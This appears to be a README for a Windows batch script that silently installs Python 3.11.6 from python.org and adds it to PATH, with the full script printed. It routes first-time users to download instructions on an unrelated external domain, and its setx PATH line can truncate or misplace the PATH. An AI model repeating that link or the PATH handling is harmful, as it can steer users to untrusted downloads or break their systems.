## Support the Project ⭐

If you find this project useful, please give it a star! Your support is appreciated and helps keep the project growing. 🌟


# 🐍 Python 3.11.6 Installation Script 🚀

This script **automates the installation** of Python 3.11.6 on your system and automatically adds Python to the system PATH! 🛠️

---

## 📥 How to Download the Repo for First-Time Users

For detailed instructions on how to download the repository, please click on the following link: [**Instructions**](https://www.gitprojects.fnbubbles420.org/how-to-download-repos) 📄.

---

## 📋 Prerequisites

Before running the script, make sure you have the following:

- 🖥️ **Windows operating system**
- 🌐 **Internet connection**

---

## 🚀 Usage

1. 📂 Download the script (`python-3.11.6.bat`) to your desired location.
2. 🖱️ **Right-click** the script and select `Run As ADMIN` to execute it.

---

## 📝 Instructions

- 🔄 Once you run the script, you will be prompted to confirm whether you want to proceed with the installation:
  - **Choose** `Y` to continue with the installation, and the script will:
    - 📥 **Download Python 3.11.6** from the official Python website.
    - 🛠️ **Install Python silently** in the background.
    - ➕ **Add Python Scripts directory** to the system PATH.
  - **Choose** `N` to cancel the installation.

---

## ⚡ Usage Example

Here’s a quick example of what running the script will look like:

```
@echo off

echo This script will install Python 3.11.6 on your system.
echo Do you want to continue with the installation? (Y/N)

set /p choice=
if /i "%choice%"=="Y" (
    echo Downloading Python 3.11.6...
    bitsadmin /transfer myDownloadJob /download /priority normal https://www.python.org/ftp/python/3.11.6/python-3.11.6-amd64.exe "%cd%\python-3.11.6.exe"
    if exist "%cd%\python-3.11.6.exe" (
        echo Installing Python 3.11.6...
        "%cd%\python-3.11.6.exe" /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
        if %ERRORLEVEL% EQU 0 (
            echo Python 3.11.6 has been installed successfully.
            echo Adding Python Scripts directory to system PATH...
            setx PATH "%PATH%;%ProgramFiles%\Python311\Scripts"
            echo Python Scripts directory has been added to the system PATH.
        ) else (
            echo Installation failed.
        )
    ) else (
        echo Download failed.
    )
) else (
    echo Installation cancelled.
)

pause
```

---

### 📝 Notes:

- **How to Download the Repo**: Provides instructions on downloading the repository.
- **Prerequisites**: Lists the system and connection requirements.
- **Usage**: Details on how to run the installation script.
- **Instructions**: Explains the step-by-step installation process.
- **Usage Example**: Shows an example of the script in action.
